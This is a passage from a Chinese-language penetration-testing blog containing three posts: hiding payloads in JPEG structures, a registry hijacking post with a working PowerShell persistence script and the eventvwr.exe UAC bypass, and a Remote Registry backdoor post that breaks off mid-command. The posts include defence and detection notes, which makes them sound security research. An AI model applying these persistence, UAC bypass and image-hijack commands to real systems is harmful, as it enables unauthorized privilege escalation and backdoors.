    <p>16进制编辑器：<code class="language-plaintext highlighter-rouge">Hex Editor</code></p>
  </li>
  <li>
    <p>隐写检测：<code class="language-plaintext highlighter-rouge">Stegdetect</code></p>
  </li>
</ul>

<p>下载地址：</p>

<p>https://github.com/abeluck/stegdetect</p>

<ul>
  <li>编辑Exit信息：<code class="language-plaintext highlighter-rouge">MagicEXIF</code></li>
</ul>

<p>下载地址：</p>

<p>http://www.magicexif.com/</p>

<ul>
  <li>分析JPEG图片格式：<code class="language-plaintext highlighter-rouge">JPEGsnoop</code></li>
</ul>

<p>下载地址：</p>

<p>http://www.impulseadventure.com/photo/jpeg-snoop.html</p>

<h2 id="0x01-相关概念">0x01 相关概念</h2>
<hr>

<h3 id="jpeg文件">JPEG文件</h3>

<p>JPEG是Joint Photographic Experts Group(联合图像专家组)的缩写</p>

<p>支持有陨压缩</p>

<p>不支持透明</p>

<p>不支持动画</p>

<p>非矢量</p>

<p><strong>JEPG同JPG的区别</strong></p>

<p>JPEG既可作为扩展名，又能代表文件格式</p>

<p>JPG是JPEG的简写，代表扩展名</p>

<p>JPEG和JPG基本上是没有区别的，它们的格式也是通用的</p>

<h3 id="色彩模型">色彩模型</h3>

<p>采用YCrCb色彩模型，更适合图形压缩，而不是RGB</p>

<ul>
  <li>Y表示亮度</li>
  <li>Cr表示红色分量</li>
  <li>Cb表示蓝色分量</li>
</ul>

<p>人眼对图片上的亮度Y的变化远比色度C的变化敏感. 如果每个点保存一个8bit的亮度值Y, 每2x2个点保存一个CrCb值, 图象在肉眼中的感觉不会起太大的变化，而且节省一半的空间</p>

<p>RGB模型4个点需要4x3=12字节</p>

<p>YCrCb模型4个点需要4+2=6字节</p>

<p><strong>[R G B] -&gt; [Y Cb Cr] 转换：</strong></p>

<p>Y = 0.299<em>R + 0.587</em>G + 0.114*B</p>

<p>Cb =  - 0.1687<em>R - 0.3313</em>G + 0.5   *B + 128</p>

<p>Cr =    0.5   <em>R - 0.4187</em>G - 0.0813*B + 128</p>

<p><strong>[Y,Cb,Cr] -&gt; [R,G,B] 转换：</strong></p>

<p>R = Y                    + 1.402  *(Cr-128)</p>

<p>G = Y - 0.34414<em>(Cb-128) - 0.71414</em>(Cr-128)</p>

<p>B = Y + 1.772  *(Cb-128)</p>

<h3 id="文件格式">文件格式</h3>

<p>JPEG文件大体上可以分成两个部分：标记码和压缩数据</p>

<p><strong>标记码：</strong></p>

<p>由两个字节构成，第一个字节是固定值<code class="language-plaintext highlighter-rouge">0xFF</code>，后一个字节则根据不同意义有不同数值</p>

<p>在每个标记码之前可以添加数目不限的无意义的0xFF填充，连续的多个0xFF可以被理解为一个0xFF，并表示一个标记码的开始</p>

<p>常见的标记码：</p>

<ul>
  <li>SOI  0xD8 图像开始</li>
  <li>APP0 0xE0  应用程序保留标记0</li>
  <li>APPn 0xE1 - 0xEF  应用程序保留标记n(n=1～15)</li>
  <li>DQT  0xDB 量化表(Define Quantization Table)</li>
  <li>SOF0 0xC0 帧开始(Start Of Frame)</li>
  <li>DHT  0xC4 定义Huffman表(Define Huffman Table)</li>
  <li>DRI  0XDD 定义差分编码累计复位的间隔(Define Restart Interval)</li>
  <li>SOS  0xDA 扫描开始(Start Of Scan)</li>
  <li>EOI  0xD9 图像结束</li>
</ul>

<p><strong>压缩数据：</strong></p>

<p>前两个字节保存整个段的长度，包括这两个字节</p>

<p><strong>注：</strong></p>

<p>这个长度的表示方法按照高位在前，低位在后，与PNG文件的长度表示方法不同</p>

<p>例如长度是0x12AB，存储顺序为0x12，0xAB</p>

<h3 id="exif信息">Exif信息</h3>

<p>Exif文件是JPEG文件的一种，遵从JPEG标准，只是在文件头信息中增加了拍摄信息和索引图</p>

<p>用相机拍出来的jpeg都会有这个信息</p>

<p>储存在APP1(0xFFE1)数据区中</p>

<p>接下来两字节保存APP1数据区(即Exif数据区)的大小</p>

<p>接着为Exif Header，固定结构：0x457869660000</p>

<p>后面为Exif的数据</p>

<p>查看Exif信息的工具：<code class="language-plaintext highlighter-rouge">exiftool</code></p>

<p><strong>下载地址：</strong></p>

<p>https://github.com/alchemy-fr/exiftool</p>

<p>编辑Exit信息的工具：<code class="language-plaintext highlighter-rouge">MagicEXIF</code></p>

<p><strong>下载地址：</strong></p>

<p>http://www.magicexif.com/</p>

<p>添加操作如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-27/3-1.png" alt="Alt text"></p>

<h2 id="0x02-常见隐写方法">0x02 常见隐写方法</h2>
<hr>

<ul>
  <li>
    <p>DCT加密</p>
  </li>
  <li>
    <p>LSB加密</p>
  </li>
  <li>
    <p>DCT LSB</p>
  </li>
  <li>
    <p>Average DCT</p>
  </li>
  <li>
    <p>High  Capacity  DCT</p>
  </li>
  <li>
    <p>High  Capacity  DCT - Algorithm</p>
  </li>
</ul>

<p>以上隐写方法引用自：</p>

<p>https://www.blackhat.com/docs/asia-14/materials/Ortiz/Asia-14-Ortiz-Advanced-JPEG-Steganography-And-Detection.pdf</p>

<p>目前已经有很多开源的工具能够实现以上高级的隐写方法</p>

<p><strong>常见隐写工具：</strong></p>

<ul>
  <li>JSteg</li>
  <li>JPHide</li>
  <li>OutGuess</li>
  <li>Invisible Secrets</li>
  <li>F5</li>
  <li>appendX</li>
  <li>Camouflage</li>
</ul>

<p>当然，对应的隐写检测工具也出现了很久</p>

<p>比如：<code class="language-plaintext highlighter-rouge">Stegdetect</code></p>

<p><strong>下载地址：</strong></p>

<p>https://github.com/abeluck/stegdetect</p>

<h2 id="0x03-利用jpeg文件格式隐藏payload">0x03 利用JPEG文件格式隐藏Payload</h2>
<hr>

<p>接下来介绍在学习文件格式后产生的一些隐藏思路：</p>

<h3 id="1直接在尾部添加数据">1、直接在尾部添加数据</h3>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-27/4-1.png" alt="Alt text"></p>

<p>如图，不会影响图片的正常浏览</p>

<h3 id="2插入自定义com注释">2、插入自定义COM注释</h3>

<p>COM注释为0xff和0xfe</p>

<p>插入数据0x11111111</p>

<p>长度为0x04</p>

<p>总长度为0x06</p>

<p>完整的十六进制格式为<code class="language-plaintext highlighter-rouge">0xffff000611111111</code></p>

<p>插入位置为DHT前面，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-27/4-2.png" alt="Alt text"></p>

<p>插入后如图，不影响图片的正常查看</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-27/4-3.png" alt="Alt text"></p>

<p>将ff改为fe，如图，同样不影响图片的正常查看</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-27/4-4.png" alt="Alt text"></p>

<h3 id="3插入可被忽略的标记码">3、插入可被忽略的标记码</h3>

<p>原理同上，标志码换成可被忽略的特殊值</p>

<p>例如：</p>

<ul>
  <li>00</li>
  <li>01 *TEM</li>
  <li>d0 *RST0</li>
  <li>dc DNL</li>
  <li>ef APP15</li>
</ul>

<p>经测试以上标识码均不影响图片的正常查看</p>

<h3 id="4修改dqt">4、修改DQT</h3>

<p>DQT: Define Quantization Table</p>

<p>标识码为0xdb</p>

<p>接下来两字节表示长度</p>

<p>接下来一字节表示QT设置信息</p>

<p>前4bit为QT号</p>

<p>后4bit为QT精度,0=8bit,否则为16bit</p>

<p>最后是QT信息，长度为64的整数倍</p>

<p>查看测试图片的DQT信息，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-27/4-5.png" alt="Alt text"></p>

<p>长度为0x43，十进制为67</p>

<p>00表示QT号为0，精度为8bit</p>

<p>接着64字节为QT信息字节</p>

<p><strong>注：</strong></p>

<p>此处DQT格式参考自http://www.opennet.ru/docs/formats/jpeg.txt</p>

<p>尝试将这64字节替换，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-27/4-6.png" alt="Alt text"></p>

<p>前后对比如图，能够发现图片的变化</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-27/4-7.png" alt="Alt text"></p>

<p>如果仅仅是调整其中部分字节，改为payload，那么能有多大区别呢，对比如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-27/4-8.png" alt="Alt text"></p>

<p>依次类推，可供修改的位置还有很多</p>

<h2 id="0x04-检测和识别">0x04 检测和识别</h2>
<hr>

<p>对于以上的隐藏方法，借助jpeg图片格式分析工具就能发现其中的痕迹</p>

<p>比如<code class="language-plaintext highlighter-rouge">JPEGsnoop</code></p>

<p><strong>下载地址：</strong></p>

<p>http://www.impulseadventure.com/photo/jpeg-snoop.html</p>

<p>支持如下文件的格式分析：</p>

<ul>
  <li>.JPG - JPEG Still Photo</li>
  <li>.THM - Thumbnail for RAW Photo / Movie Files</li>
  <li>.AVI* - AVI Movies</li>
  <li>.DNG - Digital Negative RAW Photo</li>
  <li>.PSD - Adobe Photoshop files</li>
  <li>.CRW, .CR2, .NEF, .ORF, .PEF - RAW Photo</li>
  <li>.MOV* - QuickTime Movies, QTVR (Virtual Reality / 360 Panoramic)</li>
  <li>.PDF - Adobe PDF Documents</li>
</ul>

<p><strong>实际测试：</strong></p>

<p>如下图，发现了图片中添加的COM注释</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-27/5-1.png" alt="Alt text"></p>

<p>如下图，通过查看DQT的数据识别添加的payload，0x11对应的十进制为17</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-27/5-2.png" alt="Alt text"></p>

<p>同样，JPEGsnoop能够解析jpeg图片的EXIF信息，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-27/5-3.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>为便于测试，截图中的以下数值通过MagicEXIF软件手动添加：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  EXIF Make/Model:     OK   [test] [???]
  EXIF Makernotes:     NONE
  EXIF Software:       OK   [MagicEXIF Metadata Codec 1.02]
</code></pre></div></div>

<h2 id="0x05-补充">0x05 补充</h2>
<hr>

<p>相比于png文件，由于jpeg文件没有对图像数据的校验位，所以在jpeg文件中添加payload简单了很多</p>

<p>下载JPEG图片解析并执行payload的方法不再介绍</p>

<p>(可参照https://3gstudent.github.io/3gstudent.github.io/%E9%9A%90%E5%86%99%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8PNG%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E9%9A%90%E8%97%8FPayload/)</p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文对JPEG的格式进行介绍，着重分析如何根据JPEG的文件格式，利用特定标志码隐藏payload，这种方式虽然不会影响图片的正常浏览，但是借助于格式分析软件仍能够发现其中的细节。介绍JPEG格式的官方文档里面待学习的内容还有很多，认识越深，可供研究的技巧将会更多。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on October 27, 2016
  </div>

  
</article><article class="post">
  <h1>Userland registry hijacking</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>
<p>之前我在研究”Use SCT to Bypass Application Whitelisting Protection”的时候曾有过一个想法：在执行regsvr32命令注册COM组件的过程中，在注册表HKEY_CLASSES_ROOT\CLSID\下会同步创建COM组件的键值，并且classid的子项InprocServer32下会包含scrobj.dll的绝对路径，那么如果修改了子项InprocServer32的键值，能否实现对某些操作的劫持？</p>

<p>然而实际修改HKCR\CLSID\下的键值需要管理员权限，因此没有对这个想法深入研究。直到最近，Matt Nelson@enigma0x3的博客给了我新的思路，只需要普通用户权限就可以实现对高权限系统注册表键值的劫持，让我对userland registry hijacking有了新的认识。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>
<p>本文将对userland registry hijacking的原理进行介绍，实例分析在Userland Persistence和BypassUAC两方面的具体应用，借助Process Monitor，介绍一种寻找BypassUAC的方法。</p>

<h2 id="0x02-userland-registry-hijacking原理">0x02 Userland registry hijacking原理</h2>
<hr>

<h3 id="1键值同步">1、键值同步</h3>

<p>修改HKCU:\Software\Classes\下的键值中默认名称的数据，可以同时修改HKCR:\下对应键值默认名称的数据(前提是HKCR:\已存在此注册表项)</p>

<p>例如：</p>

<p>编辑HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command的默认值为c:\test\admin.exe</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-22/1-1.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>默认HKEY_CURRENT_USER\Software\Classes\下不存在mscfile\shell\open\command，需要自己创建</p>

<p>定位到HKEY_CLASSES_ROOT\mscfile\shell\open\command下，发现默认值被自动修改为c:\test\admin.exe</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-22/1-2.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>在HKCU:\Software\Classes\CLSID下新建一个HKCR:\CLSID不存在的键值，并不会更新HKCR:\CLSID的数据</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-22/1-3.png" alt="Alt text"></p>

<p>新建HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command\1，默认名称的数据设为1，然而HKEY_CLASSES_ROOT\mscfile\shell\open\command并不会新建子项1</p>

<h3 id="2权限">2、权限</h3>

<ul>
  <li>
    <p>修改HKCU下的键值只需要普通用户权限</p>
  </li>
  <li>
    <p>修改HKCR下的键值需要管理员权限</p>
  </li>
</ul>

<p>综上，只需要以普通用户的权限编辑HKCU:\Software\Classes\下的键值就可以同步修改对应管理员权限HKCR下的键值。</p>

<p>根据以上介绍的原理，可具体应用在Userland Persistence和BypassUAC两方面：</p>

<h2 id="0x03-userland-persistence-with-scheduled-tasks">0x03 Userland Persistence With Scheduled Tasks</h2>
<hr>

<p>如果劫持系统某个计划任务对应的注册表键值，修改其中要启动的dll绝对路径，那么仅需普通用户权限就能实现一个后门，具体操作如下：</p>

<h3 id="1查看计划任务同注册表的对应关系">1、查看计划任务同注册表的对应关系</h3>

<p>系统中的计划任务同注册表HKCU:\Software\Classes\CLSID\下的键值存在对应关系，可借助<code class="language-plaintext highlighter-rouge">Matt Nelson@enigma0x3</code>分享的脚本直接查看</p>

<p><strong>下载地址：</strong></p>

<p>https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Get-ScheduledTaskComHandler.ps1</p>

<p><strong>注：</strong></p>

<p>通过计划任务面板查看的信息不完全，计划任务面板的打开方式为：我的电脑-右键-管理，找到计划任务，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-22/1-4.png" alt="Alt text"></p>

<p>ps脚本获取的部分对应关系如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-22/1-5.png" alt="Alt text"></p>

<p>可获得每个计划任务对应注册表键值的位置和启动的dll</p>

<h3 id="2修改对应键值中的dll位置">2、修改对应键值中的dll位置</h3>

<p>找到对应关系后，需要定位具体的注册表键值位置，即HKEY_CURRENT_USER\Software\Classes\CLSID{CLSID},通常情况HKCU下该键值不存在，需要手动建立，默认值设为需要运行的测试dll的绝对路径，键值创建后HKCR下的键值会同步更新，计划任务启动的dll随之被修改。</p>

<p><strong>实例：</strong></p>

<p>1、查看计划任务同注册表的对应关系</p>

<p>运行Get-ScheduledTaskComHandler找到可被劫持的dll，挑选一个通用的计划任务——UserTask，详细信息如下：</p>

<p>TaskName      : UserTask</p>

<p>CLSID         : {58fb76b9-ac85-4e55-ac04-427593b1d060}</p>

<p>Dll           : C:\Windows\system32\dimsjob.dll</p>

<p>Logon         : True</p>

<p>IsUserContext : True</p>

<p><strong>注：</strong></p>

<p>此操作需要查找HKCR下的键值，所以需要管理员权限才可以获得</p>

<p>2、修改对应键值中的dll位置</p>

<p>在HKEY_CURRENT_USER\Software\Classes\CLSID\下新建项{58fb76b9-ac85-4e55-ac04-427593b1d060}</p>

<p>接着新建项InprocServer32</p>

<p>值设定为c:\test\MessageBox32.dll</p>

<p><strong>注：</strong></p>

<p>注册表项{58fb76b9-ac85-4e55-ac04-427593b1d060}通用，不同系统下键值名称相同</p>

<p>MessageBox32.dll下载地址为：</p>

<p>https://github.com/enigma0x3/MessageBox</p>

<p>实际测试发现https://github.com/enigma0x3/MessageBox/tree/master/bin的dll在win7下失效，使用源代码重新编译生成新的dll可以使用</p>

<p>此时查看HKEY_CLASSES_ROOT\CLSID{58fb76b9-ac85-4e55-ac04-427593b1d060}\InprocServer32，默认值被修改为c:\test\MessageBox32.dll，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-22/2-0.png" alt="Alt text"></p>

<p>注销用户，重新登录，MessageBox32.dll被加载，弹框</p>

<p>但是在Scheduled Task面板的日志中会提示DLL中出错(0x800401F9)，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-22/2-1.png" alt="Alt text"></p>

<p>猜测是导出函数的问题导致dll加载报错，使用dumpbin查看计划任务UserTask对应的原dll的导出函数，执行：</p>

<p>dumpbin /exports C:\Windows\system32\dimsjob.dll</p>

<p><strong>注：</strong>
UserTask对应的原dll的绝对路径为C:\Windows\system32\dimsjob.dll</p>

<p>获得dimsjob.dll的导出函数表，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-22/2-2.png" alt="Alt text"></p>

<p>所以需要为dll添加新的导出函数：</p>

<ul>
  <li>DllCanUnloadNow</li>
  <li>DllGetClassObject</li>
  <li>DllRegisterServer</li>
  <li>DllUnregisterServer</li>
</ul>

<p><strong>注：</strong></p>

<p>具体为dll添加导出函数的方法在《Code Execution of Regsvr32.exe》做了详细介绍，此处略过</p>

<p>添加成功后，dumpbin查看结果如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-22/2-3.png" alt="Alt text"></p>

<p>替换旧的MessageBox32.dll，注销用户，重新登录，新的MessageBox32.dll被加载，弹框</p>

<p>查看Scheduled Task面板的日志，问题解决，操作成功完成，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-22/2-4.png" alt="Alt text"></p>

<p>以上操作可通过powershell自动实现，修改UserTask的代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function Invoke-ScheduledTaskComHandlerUserTask
{
    [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'Medium')]
    Param (
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Command,

        [Switch]
        $Force
    )
    $ScheduledTaskCommandPath = "HKCU:\Software\Classes\CLSID\{58fb76b9-ac85-4e55-ac04-427593b1d060}\InprocServer32"
    if ($Force -or ((Get-ItemProperty -Path $ScheduledTaskCommandPath -Name '(default)' -ErrorAction SilentlyContinue) -eq $null)){
        New-Item $ScheduledTaskCommandPath -Force |
            New-ItemProperty -Name '(Default)' -Value $Command -PropertyType string -Force | Out-Null
    }else{
        Write-Verbose "Key already exists, consider using -Force"
        exit
    }

    if (Test-Path $ScheduledTaskCommandPath) {
        Write-Verbose "Created registry entries to hijack the UserTask"
    }else{
        Write-Warning "Failed to create registry key, exiting"
        exit
    }  
}
Invoke-ScheduledTaskComHandlerUserTask -Command "C:\test\testmsg.dll" -Verbose

</code></pre></div></div>
<p>测试系统： Win7 x86</p>

<p>在运行后，当用户重新登录后，加载dll，实际演示如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-22/2-5.gif" alt="Alt text"></p>

<p>依次执行DLL_PROCESS_ATTACH()和DllGetClassObject(),由于DllGetClassObject()仅作弹框，所以之后会显示taskhost.exe报错</p>

<p><strong>注：</strong>
此处仅作演示，暂不介绍具体解决方法</p>

<p>至此，成功劫持计划任务UserTask，在系统启动时加载testmsg.dll</p>

<h2 id="0x04-uacbypass">0x04 UACBypass</h2>
<hr>
<p>计划任务同注册表HKCR:\下的键值存在对应关系，同样一些高权限的程序也会调用HKCR:\下的键值，这就为Bypass UAC带来了可能。</p>

<p>同样的原理，通过修改HKEY_CURRENT_USER\Software\Classes\下的键值同步修改HKCR:\下的键值，如果高权限的程序在运行过程中调用此处被修改过的键值，自然就实现了Bypass UAC，以高权限启动我们设定的程序。</p>

<p>此处的难点在于找到这个高权限的程序</p>

<p><strong>方法：</strong>
借助Process Monitor，可以查看程序运行过程中的注册表、文件、网络、进程间的调用关系</p>

<p>接下来使用Process Monitor复现一下Matt Nelson@enigma0x3发现的过程</p>

<h3 id="1找到高权限的exe">1、找到高权限的exe</h3>
<p>Matt Nelson@enigma0x3的方法为使用sigcheck查看exe的manifest</p>

<p>参数如下：</p>

<p>sigcheck.exe -m c:\windows\system32\eventvwr.exe</p>

<p>返回结果如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-22/3-1.png" alt="Alt text"></p>

<p>从level=”highestAvailable”得知eventvwr.exe的权限为高权限</p>

<p><strong>注：</strong></p>

<p>提供一个更加直观的判断方法：</p>

<p>查看文件图标，如果带有UAC标志，那么一定是高权限的程序，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-22/3-2.png" alt="Alt text"></p>

<h3 id="2使用process-monitor查看进程调用关系">2、使用Process Monitor查看进程调用关系</h3>

<p>启动Process Monitor</p>

<p>运行eventvwr.exe</p>

<p>Process Monitor选择Tools-Process Tree，找到eventvwr.exe，右键-Go To Event，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-22/3-3.png" alt="Alt text"></p>

<p>仔细查看进程调用关系，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-22/3-4.png" alt="Alt text"></p>

<p>找到如下信息：</p>

<ul>
  <li>
    <p>eventvwr.exe的权限为high</p>
  </li>
  <li>
    <p>eventvwr.exe首先查询键值HKCU\Software\Classes\mscfile\shell\open\command，查询结果为NAME NOT FOUND</p>
  </li>
  <li>
    <p>eventvwr.exe接着查询键值HKCR\mscfile\shell\open\command，结果为SUCCESS</p>
  </li>
</ul>

<h3 id="3修改测试">3、修改测试</h3>

<p>如果修改键值HKCU\Software\Classes\mscfile\shell\open\command，使其查询结果为SUCCESS，会如何呢？</p>

<p>下面首先修改键值HKCU\Software\Classes\mscfile\shell\open\command，值为calc.exe</p>

<p>再次运行eventvwr.exe，发现启动了calc.exe</p>

<p>使用Process Monitor查看进程调用关系，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-22/3-5.png" alt="Alt text"></p>

<p>此时对键值HKCU\Software\Classes\mscfile\shell\open\command的查询结果为SUCCESS</p>

<p>至此，成功通过修改HKCU\Software\Classes\mscfile\shell\open\command，实现BypassUAC，获得了高权限</p>

<p>calc.exe的权限为high，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-22/3-6.png" alt="Alt text"></p>

<h3 id="4更多结论">4、更多结论</h3>

<p>修改HKCU\Software\Classes\mscfile\shell\open\command后，会劫持所有.msc文件的运行，如gpedit.msc,如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-22/2-6.png" alt="Alt text"></p>

<p>按照这个方法，我对system32下的所有高权限exe进行了测试，尚未发现根据同样的方法利用command键值实现的UACBypass，但是其他键值仍值得测试。</p>

<h2 id="0x05-防御">0x05 防御</h2>
<hr>
<p>Win10系统已对该处做了修复，低版本Windows系统尚未修复，防御建议：</p>

<ul>
  <li>
    <p>set the UAC level to “Always Notify”</p>
  </li>
  <li>
    <p>remove the current user from the Local Administrators group</p>
  </li>
  <li>
    <p>alert on new registry entries in HKCU\Software\Classes\</p>
  </li>
</ul>

<blockquote>
  <p>引用自https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/</p>
</blockquote>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>
<p>计划任务中可被用作persistence的dll有很多，在防御上建议对此进行监控。
通过Process Monitor寻找BypassUAC的方法值得继续研究，一定会有新的发现。</p>

<p><strong>相关学习资料：</strong></p>

<p>https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/</p>

<p>https://enigma0x3.net/2016/05/25/userland-persistence-with-scheduled-tasks-and-com-handler-hijacking/</p>

<p>https://blog.gdatasoftware.com/2014/10/23941-com-object-hijacking-the-discreet-way-of-persistence</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

  </div>

  <div class="date">
    Written on August 22, 2016
  </div>

  
</article><article class="post">
  <h1>渗透技巧——Windows下的Remote Registry</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>Windows下的Remote Registry允许远程用户修改当前计算机的注册表设置</p>

<p>在渗透测试中，获得了管理员权限后，可以利用Remote Registry服务作为后门</p>

<p>我受到harmj0y博客的启发，打算对Remote Registry的后门利用方法做扩展，并且加入一些我在研究GPO的经验，整理成文。</p>

<p>参考资料：</p>

<p>http://www.harmj0y.net/blog/activedirectory/remote-hash-extraction-on-demand-via-host-security-descriptor-modification/</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>Remote Registry的开启方法</li>
  <li>工作组和域环境下的利用方法</li>
  <li>防御检测</li>
</ul>

<h2 id="0x01-remote-registry的正常使用">0x01 Remote Registry的正常使用</h2>
<hr>

<p>测试环境：</p>

<ul>
  <li>Win7x64</li>
  <li>192.168.112.128</li>
</ul>

<h3 id="1开启remote-registry服务">1、开启Remote Registry服务</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net start remoteregistry
</code></pre></div></div>

<h3 id="2添加aclaccess-control-list">2、添加ACL(Access Control List)</h3>

<p>注册表位置：<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg</code></p>

<h4 id="1通过界面添加权限指定用户">(1)通过界面添加权限，指定用户</h4>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-18/2-1.png" alt="Alt text"></p>

<h4 id="2通过poweshell实现">(2)通过poweshell实现</h4>

<p>添加用户test1的完全访问权限</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$acl = Get-Acl HKLM:\SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg
$person = [System.Security.Principal.NTAccount]"test1"
$access = [System.Security.AccessControl.RegistryRights]"FullControl"
$inheritance = [System.Security.AccessControl.InheritanceFlags]"ObjectInherit,ContainerInherit"
$propagation = [System.Security.AccessControl.PropagationFlags]"None"
$type = [System.Security.AccessControl.AccessControlType]"Allow"
$rule = New-Object System.Security.AccessControl.RegistryAccessRule( `
$person,$access,$inheritance,$propagation,$type)
$acl.AddAccessRule($rule)
Set-Acl HKLM:\SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg $acl
</code></pre></div></div>

<h3 id="3远程连接">3、远程连接</h3>

<p>使用另一台主机，连接192.168.112.128</p>

<h4 id="1通过regeditexe">(1)通过regedit.exe</h4>

<p><code class="language-plaintext highlighter-rouge">File</code>-&gt; <code class="language-plaintext highlighter-rouge">Connect Network Registry...</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-18/2-2.png" alt="Alt text"></p>

<p>填入IP，接着输入用户test1的口令，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-18/2-3.png" alt="Alt text"></p>

<p>连接成功后，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-18/2-4.png" alt="Alt text"></p>

<h4 id="2通过powershell实现">(2)通过powershell实现</h4>

<p>先建立ipc连接：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net use \\192.168.112.128 /u:test1 Password123!
</code></pre></div></div>

<p>查询192.168.112.128的注册表项：<code class="language-plaintext highlighter-rouge">HKLM:\System\CurrentControlSet</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$computer1='192.168.112.128'
$Reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey([Microsoft.Win32.RegistryHive]::LocalMachine,$computer1)
$RegSubKey = $Reg.OpenSubKey("System\CurrentControlSet")
$RegSubKey.GetSubKeyNames()
</code></pre></div></div>

<h2 id="0x02-利用方法1远程执行程序">0x02 利用方法1：远程执行程序</h2>
<hr>

<p>如果能够修改远程计算机的注册表设置，那么可以选择使用映像劫持，劫持进程的启动或者进程的结束</p>

<h3 id="1工作组环境">1、工作组环境</h3>

<p>以劫持<code class="language-plaintext highlighter-rouge">notepad.exe</code>为例，实际启动的进程为<code class="language-plaintext highlighter-rouge">calc.exe</code></p>

<p>劫持进程的启动：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v debugger /t REG_SZ /d "c:\windows\system32\calc.exe"
</code></pre></div></div>

<p>劫持进程的结束：</p>

